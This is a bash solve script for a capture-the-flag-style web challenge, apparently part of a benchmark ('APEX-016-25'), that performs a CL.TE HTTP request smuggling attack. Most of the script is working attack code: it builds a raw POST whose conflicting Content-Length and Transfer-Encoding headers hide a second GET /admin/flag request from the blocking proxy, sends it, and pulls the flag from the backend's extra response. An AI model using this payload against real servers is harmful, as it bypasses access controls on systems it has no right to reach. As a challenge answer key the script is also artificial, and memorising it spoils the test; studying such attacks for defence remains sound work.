#!/usr/bin/env bash
# APEX-016-25 — "HTTP Request Smuggling (CL.TE)" (tags: request_smuggling, desync)
#
# The proxy blocks `/admin/*` and decides where a request ends by its
# `Content-Length`. The Node backend, given both framing headers, believes
# `Transfer-Encoding: chunked` instead and ends the request at `0\r\n\r\n`.
# The bytes after that terminator are inside the proxy's body — so the proxy
# never looks at them as a request — and are a whole second request to the
# backend, which answers it.
#
# Two h5i features carry this one, and neither is `--set`. `--raw-request`
# sends a file byte for byte with `Content-Length` and `Transfer-Encoding`
# recomputed by nothing, because the contradiction between those two headers is
# the entire test. And the answer arrives as a *second* response on the same
# connection, which is what `trailing` in the stored message holds: the reply
# to a request this session never sent.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
. "$(dirname "$0")/lib.sh"
SESSION="apex016-$$"
WORK="$(mktemp -d)"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1; rm -rf "$WORK"' EXIT

python3 - "$URL" "$WORK/smuggled.http" <<'PY'
import sys
from urllib.parse import urlparse

parsed = urlparse(sys.argv[1])
host = parsed.netloc

# The request the proxy will not see, because as far as it is concerned these
# bytes are the body of the one above.
smuggled = f"GET /admin/flag HTTP/1.1\r\nHost: {host}\r\n\r\n"
body = "0\r\n\r\n" + smuggled
outer = (
    f"POST / HTTP/1.1\r\n"
    f"Host: {host}\r\n"
    f"Content-Type: text/plain\r\n"
    f"Content-Length: {len(body)}\r\n"      # what the proxy reads
    f"Transfer-Encoding: chunked\r\n"       # what the backend reads
    f"\r\n" + body
)
open(sys.argv[2], "wb").write(outer.encode())
PY

"$H5I" browser open "$URL/health" --session "$SESSION" --new --capture >/dev/null
SEQ="$("$H5I" websec replay req_0 --session "$SESSION" \
    --raw-request "$WORK/smuggled.http" |
    python3 -c 'import json,sys; print(json.load(sys.stdin)["seq"])')"
"$H5I" websec show "res_$SEQ" --session "$SESSION" --raw | flag
